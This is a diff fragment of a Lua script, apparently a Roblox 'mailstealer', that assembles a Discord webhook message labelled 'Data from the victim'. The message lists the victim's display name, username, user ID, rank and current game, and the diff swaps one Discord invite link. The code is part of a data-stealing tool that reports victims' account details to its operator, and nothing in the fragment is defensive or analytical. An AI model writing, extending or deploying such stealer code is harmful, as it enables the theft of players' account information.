@@ -24,7 +24,7 @@ local msg = {
     {
       ["title"]= "`Arkhalis Mailstealer Results`",
       ["description"]= "**Data from the victim**\n🧑Display Name: ".._G.PlrDisplayNameVictim.."\n🧑Username: ".._G.PlrUserVictim.."\n🧑User ID: ".._G.PlrUserIDVictim.."\n🐱Rank: ".._G.CurrentRank.."\n🎮Place: ".._G.GameIn.."",
-      ["url"]= "https://discord.gg/pd65DxGhVc",
+      ["url"]= "https://discord.gg/34fs3FWt",
       ["color"]= ""..webhookcolor.."",
     }
   },
